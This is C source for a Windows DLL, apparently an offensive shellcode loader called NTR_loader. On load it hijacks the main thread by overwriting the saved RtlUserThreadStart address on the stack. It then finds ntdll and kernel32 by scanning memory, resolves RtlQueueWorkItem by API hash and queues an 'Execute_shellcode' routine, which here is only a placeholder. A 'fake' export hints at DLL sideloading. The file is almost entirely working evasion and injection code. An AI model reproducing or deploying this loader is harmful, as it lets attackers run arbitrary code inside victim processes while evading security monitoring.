#include "NTR_loader.h"

#ifdef _WIN64
int Cx_off = 0x80;
int Ip_off = 0xf8;
int step = 0x10;
size_t addr_max = 0x7FFFFFFF0000;
size_t addr_min = 0x7FF000000000;
void functions_wrap(LPTHREAD_START_ROUTINE a, LPVOID b) {
    function(a, b);
}
#else
int Cx_off = 0xac;
int Ip_off = 0xb4;
int step = 4;
size_t addr_max = 0x7FFFF000;
size_t addr_min = 0x70000000;
__declspec(naked) void functions_wrap() {
    __asm {
        push ebx
        push eax
        call function
    }
}
#endif


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        NT_TIB* teb = NtCurrentTeb();
        intptr_t* StackBase = teb->StackBase;
        StackBase = (intptr_t*)((char*)StackBase - sizeof(intptr_t));
        PHANDLE RtlUserThreadStart = 0;

        while (RtlUserThreadStart == 0)
        {
            if (*StackBase != 0)
            {
                if (addr_min < *StackBase && *StackBase < addr_max)
                {
                    RtlUserThreadStart = StackBase;
                    ntdll_RtlUserThreadStart = *RtlUserThreadStart;
                }
            }
            if ((intptr_t)teb->StackBase - (intptr_t)StackBase > 0x10000)
            {
                printf("Fail to find RtlUserThreadStart\n");
                exit(-1);
            }
            StackBase = (intptr_t*)((char*)StackBase - step);
        }
        printf("This is dll main\n");
        printf("Get RtlUserThreadStart address: %p, Hijack main thread!\n", ntdll_RtlUserThreadStart);
        *RtlUserThreadStart = &functions_wrap;
        break;
    }
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

HANDLE GetImageBase(HANDLE addr)
{
    while (*(long long*)addr != 0x0300905A4D)
    {
        addr = (intptr_t*)((char*)addr - 0x1000);
    }
    return addr;
}


HANDLE GetImageBase32_kernel32(HANDLE addr)
{
    while (*(long long*)addr != 0x0300905A4D)
    {
        addr = (intptr_t*)((char*)addr - 0x10000);
    }
    return addr;
}


void Execute_shellcode(char* param)
{
    printf("do anything you want\n%s\n", param);
}


void function(LPTHREAD_START_ROUTINE oep, LPVOID parameter)
{
    HANDLE ThreadInitThunkFunction = 0;
    BYTE* POINT = (BYTE*)ntdll_RtlUserThreadStart;
    BYTE* point = (BYTE*)ntdll_RtlUserThreadStart;
    key = 0x47;
    Ntdll_handle = 0;
    Kernel32_handle = 0;
    printf("Hijack success, start get ntdll and kernel32 handle.\n");

    while (1)
    {
#ifdef _WIN64
        if (point[0] == 0x48 && point[1] == 0x8B && point[2] == 0x05)
        {
            ThreadInitThunkFunction = *(intptr_t*)(*(int*)(point + 3) + 7 + (intptr_t)(point));
            break;
        }
#else
        // E9 jmp
        if (point[0] == 0xE9 && point[4] == 0xFF)
        {
            point = point + 5 + *(int*)(point + 1);
            int count = 0;
            POINT = point;
            while (1)
            {
                // E8 call
                if (point[0] == 0xE8 && point[4] == 0)
                {
                    count++;
                    if (count == 2)
                    {
                        point = point + 5 + *(int*)(point + 1);
                        POINT = point;
                        while (1)
                        {
                            // mov esi, addr
                            if (point[0] == 0x8B && point[1] == 0x35)
                            {
                                ThreadInitThunkFunction = *(intptr_t*)(*(int*)(point + 2));
                                break;
                            }
                            if (point - POINT > 0x30)
                            {
                                break;
                            }
                            point++;
                        }
                        break;
                    }
                }
                if (point - POINT > 0x40 || count >= 3)
                {
                    break;
                }
                point++;
            }
            break;
        }
#endif
        if (point - POINT > 0x70)
        {
            break;
        }
        point++;
    }


    if (ThreadInitThunkFunction == 0)
    {
        printf("Can't find ThreadInitThunkFunction\nexit");
        exit(-1);
        
    }
#ifdef _WIN64
    Kernel32_handle = GetImageBase(((intptr_t)ThreadInitThunkFunction >> 12) << 12);
#else
    Kernel32_handle = GetImageBase32_kernel32(((intptr_t)ThreadInitThunkFunction >> 16) << 16);
#endif
    Ntdll_handle = GetImageBase(((intptr_t)ntdll_RtlUserThreadStart >> 12) << 12);
    exe_handle = GetImageBase(((intptr_t)oep >> 12) << 12);
    printf("Ntdll: %p\n", Ntdll_handle);
    printf("Kernel32: %p\n", Kernel32_handle);
    printf("exe_handle: %p\n", exe_handle);

    typedef NTSTATUS(WINAPI* FRtlQueueWorkItem)(void* function, PVOID context, ULONG flags);
    FRtlQueueWorkItem RtlQueueWorkItem = GetFunctionAddressByHash(Ntdll_handle, 0x24318c7a);
    if (RtlQueueWorkItem(&Execute_shellcode, "Hello World", WT_EXECUTEDEFAULT) == 0)
    {
        //printf("Success\n");
    }
    else
    {
        //printf("Fail\n");
        exit(-1);
    }

    printf("We can back to exe oep.\n");

#ifdef _WIN64
    typedef void (WINAPI* RtlUserThreadStart_func)(LPTHREAD_START_ROUTINE, LPVOID);
    RtlUserThreadStart_func func = (RtlUserThreadStart_func)ntdll_RtlUserThreadStart;    
    func(oep, parameter);
#else
    __asm{
        mov eax,oep
        mov ebx, parameter
        call ntdll_RtlUserThreadStart
    }
#endif
}


__declspec(dllexport) void ExportedFunction()
{
    printf("This is dll export function.\nDefining fake function what you need export.\nEnd dll export function.\n");
}


